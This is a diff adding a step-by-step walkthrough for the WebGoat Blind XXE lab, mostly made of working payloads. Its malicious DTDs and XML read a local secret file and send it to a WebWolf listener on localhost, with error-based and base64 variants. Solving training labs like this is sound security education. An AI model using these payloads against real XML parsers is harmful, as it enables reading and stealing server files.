@@ -1,0 +1,255 @@
+====================================================================
+     BLIND XXE - FILE EXFILTRATION GUIDE
+====================================================================
+
+Challenge: Use Blind XXE to exfiltrate secret.txt to WebWolf
+
+Target File: C:\Users\mahad\.webgoat-2025.3\XXE\nooniman\secret.txt
+
+WebWolf URL: http://127.0.0.1:8002 (or http://192.168.254.112:8002)
+
+====================================================================
+WHAT IS BLIND XXE?
+====================================================================
+
+Blind XXE = XXE attack where you don't see the output directly
+
+Techniques:
+1. Out-of-band (OOB) - Use external server to receive data
+2. Error-based - Trigger errors that leak data
+3. Time-based - Measure response times
+
+This challenge uses OOB technique with WebWolf as your server.
+
+====================================================================
+ATTACK STRATEGY:
+====================================================================
+
+Step 1: Create malicious DTD file on WebWolf
+Step 2: Reference that DTD from your XXE payload
+Step 3: DTD reads secret.txt and sends it to WebWolf
+Step 4: Check WebWolf incoming requests for the content
+Step 5: Submit the content as a comment
+
+====================================================================
+STEP-BY-STEP SOLUTION:
+====================================================================
+
+STEP 1: Create DTD File on WebWolf
+-----------------------------------
+
+1. Open WebWolf: http://127.0.0.1:8002/WebWolf
+
+2. Go to "Files" section
+
+3. Create a file named: attack.dtd
+
+4. Content of attack.dtd (OPTION A - Simple):
+   -----------------------------------------
+   <!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?content=%file;'>">
+   %eval;
+   %exfil;
+
+5. Upload the file to WebWolf
+
+6. Get the WebWolf URL for your DTD:
+   http://127.0.0.1:8002/files/nooniman/attack.dtd
+   (Replace 'nooniman' with your username)
+
+
+STEP 2: Submit XXE Payload to WebGoat
+--------------------------------------
+
+In the WebGoat comment field, submit this XML:
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://127.0.0.1:8002/files/nooniman/attack.dtd">
+  %remote;
+]>
+<comment>
+  <text>Blind XXE Attack</text>
+</comment>
+
+(Replace 'nooniman' with your username in the URL)
+
+
+STEP 3: Check WebWolf Incoming Requests
+----------------------------------------
+
+1. Go to WebWolf → "Incoming requests"
+2. Look for a request to /WebWolf/landing
+3. The 'content' parameter should contain the secret!
+
+
+STEP 4: Submit the Secret
+--------------------------
+
+1. Copy the secret value from WebWolf
+2. Go back to WebGoat
+3. Submit a new comment with just the secret text
+4. Lesson complete!
+
+====================================================================
+ALTERNATIVE DTD FORMATS:
+====================================================================
+
+Option B - Using Error-Based (if OOB doesn't work):
+----------------------------------------------------
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+
+Option C - URL Encoding (if special characters cause issues):
+--------------------------------------------------------------
+<!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?data=%file;'>">
+%eval;
+%exfil;
+
+
+Option D - Base64 Encoding (for binary data):
+----------------------------------------------
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;
+
+====================================================================
+UNDERSTANDING THE ATTACK:
+====================================================================
+
+1. Parameter Entity (%):
+   - Used for DTD substitution
+   - Processed immediately when declared
+
+2. %file reads secret.txt:
+   <!ENTITY % file SYSTEM "file:///path/to/secret.txt">
+
+3. %eval creates dynamic entity:
+   - Defines %exfil entity
+   - %exfil makes HTTP request with file content
+
+4. %exfil; executes the request:
+   - Sends GET to WebWolf with file content as parameter
+
+5. WebWolf logs the request:
+   - Check "Incoming requests" to see the data
+
+====================================================================
+WEBWOLF ENDPOINTS:
+====================================================================
+
+For file hosting:
+http://127.0.0.1:8002/files/[username]/attack.dtd
+
+For data exfiltration:
+http://127.0.0.1:8002/WebWolf/landing?content=DATA
+http://127.0.0.1:8002/landing?secret=DATA
+http://127.0.0.1:8002/incoming?data=DATA
+
+====================================================================
+COMMON ISSUES:
+====================================================================
+
+Issue: "DTD not found"
+Solution: Check WebWolf URL is correct
+         Use: http://127.0.0.1:8002/files/[username]/attack.dtd
+
+Issue: "No data in WebWolf"
+Solution: Check file path is correct
+         Windows: C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt
+         (Note: Use forward slashes in file:/// URI)
+
+Issue: "Parser error"
+Solution: Secret might contain special XML characters
+         Use php://filter with base64 encoding
+
+Issue: "WebWolf shows nothing"
+Solution: Make sure DTD syntax is correct
+         Check for typos in entity names
+         Try different exfiltration endpoints
+
+====================================================================
+FILE PATH FORMATS:
+====================================================================
+
+For file:/// URIs, use forward slashes:
+file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt
+
+NOT backslashes:
+file:///C:\Users\mahad\.webgoat-2025.3\XXE\nooniman\secret.txt
+
+====================================================================
+DEBUGGING TIPS:
+====================================================================
+
+1. Test WebWolf is reachable:
+   - Browse to http://127.0.0.1:8002/WebWolf
+   - Should see WebWolf interface
+
+2. Test DTD is accessible:
+   - Browse to http://127.0.0.1:8002/files/[username]/attack.dtd
+   - Should download or display your DTD
+
+3. Test simple ping first:
+   DTD content:
+   <!ENTITY ping SYSTEM 'http://127.0.0.1:8002/WebWolf/landing'>
+   
+   XML payload:
+   <?xml version="1.0"?>
+   <!DOCTYPE root [
+     <!ENTITY % remote SYSTEM "http://127.0.0.1:8002/files/[username]/attack.dtd">
+     %remote;
+   ]>
+   <comment><text>test&ping;</text></comment>
+
+4. Check WebWolf logs:
+   - Go to "Incoming requests"
+   - Should see requests appearing
+
+====================================================================
+EXAMPLE FLOW:
+====================================================================
+
+1. DTD on WebWolf (attack.dtd):
+   <!ENTITY % file SYSTEM "file:///C:/Users/mahad/.webgoat-2025.3/XXE/nooniman/secret.txt">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?secret=%file;'>">
+   %eval;
+   %exfil;
+
+2. XML to WebGoat:
+   <?xml version="1.0"?>
+   <!DOCTYPE root [
+     <!ENTITY % remote SYSTEM "http://127.0.0.1:8002/files/nooniman/attack.dtd">
+     %remote;
+   ]>
+   <comment><text>Blind XXE</text></comment>
+
+3. What happens:
+   - WebGoat parser loads your XML
+   - Sees %remote entity pointing to WebWolf
+   - Downloads attack.dtd from WebWolf
+   - Processes %file (reads secret.txt)
+   - Processes %eval (creates %exfil)
+   - Executes %exfil (sends HTTP request to WebWolf with secret)
+
+4. WebWolf receives:
+   GET /WebWolf/landing?secret=[CONTENT_OF_SECRET.TXT]
+
+5. You check "Incoming requests" and see the secret!
+
+6. Submit secret as comment in WebGoat → Lesson complete!
+
+====================================================================
+REFERENCES:
+====================================================================
+
+Billion Laughs: https://en.wikipedia.org/wiki/Billion_laughs
+Blind XXE: https://portswigger.net/web-security/xxe/blind
+OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+====================================================================
